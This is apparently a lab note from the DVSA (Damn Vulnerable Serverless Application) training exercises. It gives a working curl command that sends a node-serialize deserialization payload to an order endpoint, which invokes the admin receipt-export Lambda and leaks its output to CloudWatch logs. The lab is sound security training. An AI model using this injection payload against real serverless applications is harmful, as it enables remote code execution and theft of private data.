# Lesson 03 Commands

This exploit used the Lesson 1 injection path to invoke the admin receipt export function.

```bash
export API="https://olw47gvbv9.execute-api.us-east-1.amazonaws.com/Stage/order"

curl -s -X POST "$API" \
  -H "Content-Type: application/json" \
  --data-raw '{"action":"_$$ND_FUNC$$_function(){ const { LambdaClient, InvokeCommand } = require(\"@aws-sdk/client-lambda\"); const client = new LambdaClient(); const command = new InvokeCommand({ FunctionName: \"DVSA-ADMIN-GET-RECEIPT\", InvocationType: \"RequestResponse\", Payload: Buffer.from(JSON.stringify({\"year\":\"2026\",\"month\":\"04\"})) }); client.send(command).then((r) => { console.error(\"RECEIPTS LEAK: \" + Buffer.from(r.Payload).toString()); }).catch((e) => { console.error(\"RECEIPTS LEAK ERR: \" + e); }); }()","cart-id":""}'
```

CloudWatch log group:

```text
/aws/lambda/DVSA-ORDER-MANAGER
```
